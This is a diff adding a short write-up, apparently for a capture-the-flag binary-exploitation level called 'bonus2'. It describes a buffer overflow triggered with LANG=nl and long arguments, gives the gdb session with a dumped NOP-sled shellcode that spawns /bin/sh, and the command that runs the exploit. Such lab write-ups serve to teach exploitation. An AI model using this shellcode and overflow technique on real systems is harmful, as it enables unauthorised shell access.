@@ -1,0 +1,23 @@
+# bonus2
+
+- The program check the env var `LANG` value and take 2 arg
+
+- We can see when trying LANG=nl and putting 2 long arg that we have a buffer overflow at index
+
+- We can try to put a shellcode in env and use the buffer overflow in the 2nd arg to jump to it
+
+- ```sh
+  env -i LANG=nl SHELLCODE=`python /tmp/bonus2.py shellcode` gdb ./bonus2
+  ```
+
+```gdb
+  (gdb) info reg
+  esp            0xbffffc70	0xbffffc70
+
+  (gdb) x/2000s 0xbffffc70
+  0xbfffff5b:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\353\v[1\300\061\311\061\322\260\v\315\200\350\360\377\377\377/bin/sh"
+```
+
+- ```sh
+  env -i LANG=nl SHELLCODE=`python /tmp/bonus2.py shellcode` ./bonus2 `python /tmp/bonus2.py pad 40` `python /tmp/bonus2.py exploit`
+  ```
